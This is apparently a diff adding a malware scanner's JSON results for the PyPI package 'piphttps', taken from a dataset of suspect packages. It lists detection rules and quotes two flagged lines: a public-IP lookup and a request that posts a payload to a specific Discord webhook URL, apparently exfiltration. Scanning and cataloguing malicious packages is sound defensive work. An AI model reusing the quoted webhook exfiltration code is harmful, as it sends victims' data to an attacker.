@@ -1,0 +1,29 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "piphttps/__main__.py:29",
+                "code": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "piphttps/__main__.py:129",
+                "code": "                            req = Request('https://discord.com/api/webhooks/1057781770550005850/F55mkPTDWGKw9zF0hC1xJ6Z9qK8ETjn9q2snfMYo2jutIYsgyV7S5tQQ74GCPK0y5E5y', data=payload.encode(), headers=headers2)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/piphttps-1"
+}
